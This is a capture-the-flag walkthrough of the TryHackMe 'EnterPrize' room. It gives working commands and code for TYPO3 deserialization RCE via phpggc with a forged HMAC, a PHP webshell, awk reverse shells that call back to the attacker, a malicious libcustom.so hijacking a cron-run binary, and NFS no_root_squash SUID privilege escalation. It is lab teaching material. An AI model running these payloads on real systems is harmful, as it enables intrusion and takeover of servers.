# [EnterPrize [hard]](https://tryhackme.com/room/enterprize)


# Enumeration

## Nmap
```
>>> nmap -sC -sV 10.10.91.57

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 67:c0:57:34:91:94:be:da:4c:fd:92:f2:09:9d:36:8b (RSA)
|   256 13:ed:d6:6f:ea:b4:5b:87:46:91:6b:cc:58:4d:75:11 (ECDSA)
|_  256 25:51:84:fd:ef:61:72:c6:9d:fa:56:5f:14:a1:6f:90 (ED25519)
80/tcp  open   http    Apache httpd
|_http-server-header: Apache
|_http-title: Blank Page
443/tcp closed https
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at the http server we get to this page: 

![Alt text](https://i.imgur.com/nCTJxni.png)

## Gobuster
```
>>> gobuster  -u 10.10.91.57 -w wordlists/SecLists/Discovery/Web-Content/quickhits.txt


=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.91.57/
[+] Threads      : 10
[+] Wordlist     : wordlists/SecLists/Discovery/Web-Content/quickhits.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/25 14:11:04 Starting gobuster
=====================================================
/.ht_wsr.txt (Status: 403)
/.hta (Status: 403)
...
/composer.json (Status: 200)
/index.phps (Status: 403)
/public/spaw2/dialogs/dialog.php (Status: 403)
...
/var/log/ (Status: 403)
/var/logs/ (Status: 403)
=====================================================
2024/01/25 14:11:13 Finished
=====================================================
```

Let's look at the `composer.json` file:

```
{
    "name": "superhero1/enterprize",
    "description": "THM room EnterPrize",
    "type": "project",
    "require": {
        "typo3/cms-core": "^9.5",
        "guzzlehttp/guzzle": "~6.3.3",
        "guzzlehttp/psr7": "~1.4.2",
        "typo3/cms-install": "^9.5",
	"typo3/cms-backend": "^9.5",
        "typo3/cms-core": "^9.5",
        "typo3/cms-extbase": "^9.5",
        "typo3/cms-extensionmanager": "^9.5",
        "typo3/cms-frontend": "^9.5",
        "typo3/cms-install": "^9.5",
	"typo3/cms-introduction": "^4.0"
    },
    "license": "GPL",
    "minimum-stability": "stable"
}
```

We can see that it uses [typo3](https://typo3.fr/) I have found this enumeration tool:[Typo-Enumerator](https://github.com/supersache/Typo-Enumerator)

however it find nothing :/

![Alt text](https://i.imgur.com/aW7ZqRY.png)
Maybe typo3 is installed but on a subdomain so let's enumerate subdomains:

## Wfuzz

Before enumerating the subdomains, we needs to add the machine into our `/etc/hosts`

```
>>> wfuzz -w wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --filter "c=200 and l>1" -H "Host: FUZZ.enterprize.thm" enterprize.thm 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://enterprize.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000089522:   200        48 L     1464 W     24555 Ch   maintest"                                                                                           
```
Let's add the subdomain and look what if it has typo3
![Alt text](https://i.imgur.com/hWnbKHT.png)
Bingo ! After looking at the [important directories](https://docs.typo3.org/m/typo3/reference-coreapi/main/en-us/ApiOverview/DirectoryStructure/Index.html), I have found an interesting `LocalConfiguration.old` file at `http://maintest.enterprize.thm/typo3conf/`

On this file I have found an interesting line:
```
'encryptionKey' => 712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
```

Now let's enumerate the domain with [typo3scan](https://github.com/whoot/Typo3Scan)

## Typo3scan

```
>>>> python3 typo3scan.py -d http://maintest.enterprize.thm

=========================================================================

   ________                   ________   _________                       
   \_    _/__ __ ______  _____\_____  \ /   _____/ ____ _____    ___     
     |  | |  |  |\____ \|  _  | _(__  < \_____  \_/ ___\\__  \  /   \    
     |  | |___  ||  |_) | (_) |/       \/        \  \___ / __ \|  |  \   
     |__| / ____||   __/|_____|________/_________/\_____|_____/|__|__/   
          \/     |__|                                                    

                     Automatic Typo3 enumeration tool                    
                              Version 1.1.3                              
                         https://github.com/whoot                        
=========================================================================


[ Checking http://maintest.enterprize.thm ]
-------------------------------------------------------------------------

 [+] Core Information
 --------------------
 [+] Backend Login
  ├ http://maintest.enterprize.thm/typo3/index.php
 [+] Version Information
  ├ Identified Version:     9.5
  ├ Could not identify exact version.
  ├ Do you want to print all vulnerabilities for branch 9.5? (y/n): y
  └ Known Vulnerabilities:

     [!] TYPO3-CORE-SA-2021-013
      ├ Vulnerability Type: Cross-Site-Scripting
      ├ Subcomponent:       Content Rendering, HTML Parser (ext:frontend, ext:core)
      ├ Affected Versions:  9.5.28 - 9.0.0
      ├ Severity:           Medium
      └ Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2021-013

...
...

     [!] TYPO3-CORE-SA-2023-006
      ├ Vulnerability Type: Information Disclosure
      ├ Subcomponent:       Session Handling (ext:core)
      ├ Affected Versions:  9.5.43 - 9.0.0
      ├ Severity:           Medium
      └ Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-006


 [+] Extension Search
  ├ Brute-Forcing 8735 Extensions
python typo3scan.py -d http://maintest.enterprize.thm  ├ Processed:   1% |#                                                                                           ^[[B  ├ Processed:  52% |###################################################################                                                               | ETA:  0:0  ├ Processed:  99% |################################################################################################################################# | ETA:  0:00:01
  ├ Found 2 extensions
  ├ Brute-Forcing Version Information
 [!] Version detection for extensions is unreliable. Verify manually!
  ├ Processed: 100% |##################################################################################################################################| ETA:  0:00:00

 [+] Extension Information
 -------------------------
  [+] bootstrap_package
   ├ Extension Title:       Bootstrap Package
   ├ Extension Repo:        https://extensions.typo3.org/extension/bootstrap_package
   ├ Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package
   ├ Current Version:       14.0.7 (stable)
   ├ Identified Version:    10.0.9
   ├ Version File:          http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package/CHANGELOG.md
   └ Known Vulnerabilities:

     [!] TYPO3-EXT-SA-2021-007
      ├ Vulnerability Type: Cross-Site Scripting
      ├ Affected Versions:  10.0.9 - 10.0.0
      └ Advisory Url:       https://typo3.org/security/advisory/typo3-ext-sa-2021-007


  [+] introduction
   ├ Extension Title:       The Official TYPO3 Introduction Package
   ├ Extension Repo:        https://extensions.typo3.org/extension/introduction
   ├ Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/introduction
   ├ Current Version:       4.6.1 (stable)
   ├ Identified Version:    3.1.1
   └ Version File:          http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg
```


After some search I have found this CVE: [CVE-2020-15099](https://typo3.org/security/advisory/typo3-core-sa-2020-007)
```
     [!] TYPO3-CORE-SA-2020-007
      ├ Vulnerability Type: Privilege Escalation, Remote Code Execution
      ├ Subcomponent:       eID API (ext:frontend, ext:core)
      ├ Affected Versions:  9.5.19 - 9.0.0
      ├ Severity:           High
      └ Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2020-007
```

After some search of the CVE I have found this Synacktiv [article](https://www.synacktiv.com/publications/typo3-leak-to-remote-code-execution)

Finnaly to perform the attack we need to be able to perform a `POST` request and luckily we have a page with a form: http://maintest.enterprize.thm/index.php?id=38

# Web exploitation

we will use [phpggc](https://github.com/ambionics/phpggc) to create the payload 

```
>>> git clone https://github.com/ambionics/phpggc
>>> cd phpggc/
>>> echo "<?php $output = system($_GET[1]); echo $output ; ?>" > shell.php
>>> ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/fileadmin/_temp_/kitty.php shell.php 

YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjMwOiI8P3BocCAgPSBzeXN0ZW0oKTsgZWNobyAgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7TjtzOjQxOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBmaWxlbmFtZSI7czo0MDoiL3Zhci93d3cvaHRtbC9maWxlYWRtaW4vX3RlbXBfL3NoZWxsLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO31pOjc7aTo3O30=
```

Then we need to calculate the generating the HMAC:

we can use this php script:
```php
<?php
$sig = hash_hmac('sha1', $argv[1], "71*****b");
print($sig);
?>
```

After a lot of tries, nothing works so I have decided to check the php versions.
```
>>> php -v
PHP 8.3.2-1+ubuntu22.04.1+deb.sury.org+1 (cli) (built: Jan 20 2024 14:16:40) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.3.2, Copyright (c) Zend Technologies
    with Zend OPcache v8.3.2-1+ubuntu22.04.1+deb.sury.org+1, Copyright (c), by Zend Technologies
```
The Typo3 version is [9.5](https://get.typo3.org/version/9)
so the php version running on the server is  beetween `7.2` and`7.4`

```
>>> php7.2 ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/fileadmin/_temp_/kitty.php shell.php 
   
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8va2l0dHkucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==

```

```
>>> php7.2 hash.php YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8va2l0dHkucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==

5a13c8fd32178e331eb021aa78f787037e3ff0a3
```
We will upload our reverse shell using the form on http://maintest.enterprize.thm/index.php?id=38

Just go to the page, fill the form hit next step and edit the request on burp had the payload and the hash such has `payload+hash` 
```
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8va2l0dHkucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==5a13c8fd32178e331eb021aa78f787037e3ff0a3
```
![Alt text](https://i.imgur.com/lQiAD9X.png)
![Alt text](https://i.imgur.com/duEElWT_d.webp?maxwidth=760&fidelity=grand)

then we can access our webshell on: [http://maintest.enterprize.thm/fileadmin/_temp_/kitty.php?1=id](http://maintest.enterprize.thm/fileadmin/_temp_/kitty.php?1=id)
![Alt text](https://i.imgur.com/2mCI0bz.png)
Bingo ! we can run command as www-data just editing the url with =command

We can spawn a revrse shell using [Awk](https://www.revshells.com/):

```sh
awk 'BEGIN {s = "/inet/tcp/0/IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
However it didn't worked but I just had to url encode it and boom it worked:
```
awk%20%27BEGIN%20%7Bs%20%3D%20%22%2Finet%2Ftcp%2F0%2FIP%2PORT%22%3B%20while%2842%29%20%7B%20do%7B%20printf%20%22shell%3E%22%20%7C%26%20s%3B%20s%20%7C%26%20getline%20c%3B%20if%28c%29%7B%20while%20%28%28c%20%7C%26%20getline%29%20%3E%200%29%20print%20%240%20%7C%26%20s%3B%20close%28c%29%3B%20%7D%20%7D%20while%28c%20%21%3D%20%22exit%22%29%20close%28s%29%3B%20%7D%7D%27%20%2Fdev%2Fnull
```
```
>>> nc -lvnp 1235
Listening on 0.0.0.0 1235
Connection received on 10.10.37.119 40389
shell>id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(blocked)
shell>
```
# Get user

Now let's list the users to see if we can find something interesting:
```
>> ls /home
john
>> ls /home/john
develop
user.txt
>> ls /home/john/develop
myapp
result.txt
>> cat /home/john/develop/result.txt
Welcome to my pinging application!
Test...
```
Let's download myapp and looks what it looks like
```
>>> cat /home/john/develop/myapp | base64 > myapp.txt
```
Then we can get the file on: [http://maintest.enterprize.thm/fileadmin/_temp_/myapp.txt](http://maintest.enterprize.thm/fileadmin/_temp_/myapp.txt)

then we can download the file on cyberchef
![Alt text](https://i.imgur.com/3YUk1L4.png)

Analyzing it on Ghidra I found nothing interesting on the code itself, however looking at the import, I have found a custom libc.

![Alt text](https://i.imgur.com/hqVfXfl.png)



Maybe we can find something interesting with the `libcustom`.
After some search I have found this file: `/usr/lib/libcustom.so`

We can install it the same way we did for myapp, and looking at it on ghidra we can see the code of the `do_ping` function: 
```c
void do_ping(void)
{
  puts("Test...\n");
  return;
}
```

looking back at `my_app`` we can see that the main function call `do_ping`.
```c
undefined8 main(void)

{
  puts("Welcome to my pinging application!");
  do_ping();
  return 0;
}
```
Looking at the process we can see a crontab running:
```
ps
  PID TTY          TIME CMD
  612 ?        00:00:00 sh <defunct>
  618 ?        00:00:00 sh
  620 ?        00:00:00 sh
  621 ?        00:00:00 ps
 1117 ?        00:00:00 apache2
 1118 ?        00:00:10 apache2
 1120 ?        00:00:00 apache2
 1121 ?        00:00:00 apache2
 1122 ?        00:00:00 apache2
 1472 ?        00:00:00 apache2
 1476 ?        00:00:00 apache2
 1500 ?        00:00:00 sh
 1501 ?        00:00:18 awk
 1502 ?        00:00:00 sh
 1503 ?        00:09:32 awk
 1504 ?        00:00:00 sh
 1505 ?        00:09:32 awk
 1506 ?        00:00:00 apache2
 1518 ?        00:00:00 apache2
 1793 ?        00:00:00 sh
 1795 ?        00:00:00 awk
 2466 ?        00:00:00 apache2
 6678 ?        00:00:00 sh
 6679 ?        00:00:00 crontab
 7006 ?        00:00:00 sh
 7008 ?        00:00:00 awk
 7640 ?        00:00:00 apache2
17477 ?        00:00:00 sh
17479 ?        00:00:00 sh
17481 ?        00:00:00 crontab
18155 ?        00:00:00 sh
18157 ?        00:00:11 awk
18801 ?        00:00:00 apache2
21968 ?        00:00:00 sh
21969 ?        00:00:00 awk
22518 ?        00:00:00 apache2
```
Also looking at `/home/john/develop/myapp` we can see that the Access date change every two minuts
```
>> stat /home/john/develop/myapp | grep Access
Access: (0555/-r-xr-xr-x)  Uid: ( 1000/    john)   Gid: ( 1000/    john)
Access: 2024-01-26 17:44:03.828000000 +0000
>> stat /home/john/develop/myapp | grep Access
Access: (0555/-r-xr-xr-x)  Uid: ( 1000/    john)   Gid: ( 1000/    john)
Access: 2024-01-26 17:46:03.828000000 +0000
```
So we can guess that the crontab is running `myapp`.
We will try to exploit the binnary with our own libcustom:

## libcustom.c :
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void do_ping(){
    system("awk 'BEGIN {s = \"/inet/tcp/0/IP/1213\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null", NULL, NULL);
}
```

```
>>> gcc -shared -o libcustom.so  libcustom.c
>>> python3 -m http.server 9000
```
Then download it on the host:

```
>> wget IP:9000/libcustom.so -O /home/john/develop/libcustom.so
```

Looking at myapp we can see that the libcustom path is wrong:
```
>> ldd /home/john/develop/myapp
	linux-vdso.so.1 (0x00007ffe55faf000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fe822faa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe8229a2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fe822d93000)
>> ls -la /etc/ld.so.conf.d
total 16
drwxr-xr-x  2 root root 4096 Jan  3  2021 .
drwxr-xr-x 98 root root 4096 Jan 26 13:32 ..
-rw-r--r--  1 root root   44 Jan 27  2016 libc.c/home/john/develop/libcustom.so
```
I think it is looking for the linker config file: `test.conf` so let's create it.
```
>> echo '/home/john/develop/' > /home/john/develop/test.conf
```
And now it is good:
```
>> ldd /home/john/develop/myapp
	linux-vdso.so.1 (0x00007ffe341c7000)
	libcustom.so => /home/john/develop/libcustom.so (0x00007f5d6e673000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5d6e06b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f5d6e45c000)
```




Now we just need to listen and after some time waiting I got a shell as john:
```
>>> nc -lvnp 1213
Listening on 0.0.0.0 1213
Connection received on 10.10.217.206 34787
>> id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev),1001(blocked)
```
# Stabilisation
ssh is open so let's take this oportunity.
```
>>> ssh-keygen
```
Then add the key
```
>>> cat .ssh/key.pub
```
and put it in john authorized_keys
```
>> mkdir .ssh
>> echo "public key" > .ssh/authorized_keys
```
Now we can connect to the machine:
```
>>> ssh john@IP
john@enterprize:~$ 
```

# Privesc
After some enumeration, I have found a configuration issue on nfs:
```
/var/nfs        127.0.0.1(insecure,rw,sync,no_root_squash,no_subtree_check)
```
After some search about **NFS no_root_squash** I have found this [article](https://juggernaut-sec.com/nfs-no_root_squash/)

```
>>> sudo su
>>> ssh -Nfv -L 127.0.0.1:2049:127.0.0.1:2049 john@IP
>>> mkdir /tmp/nfs
>>> cd /tmp/nfs
>>> mount -t nfs -o port=2049 127.0.0.1:/var/nfs /tmp/nfs 
```
Let's make our suid binary and continue the attack:
```c
int main(void) {
    setgid(0); setuid(0);
    system("/bin/sh");
}
```
```
>>> gcc -static  -o suid suid.c
>>> chmod +sx suid
>>> ssh john@IP
john@10.10.128.41: Permission denied (publickey).
```
Just create a key and add it to john authorized keys and try again.
```
>>> ssh john@IP
>> /var/nfs/suid -p?
```
Well done we are now root :)
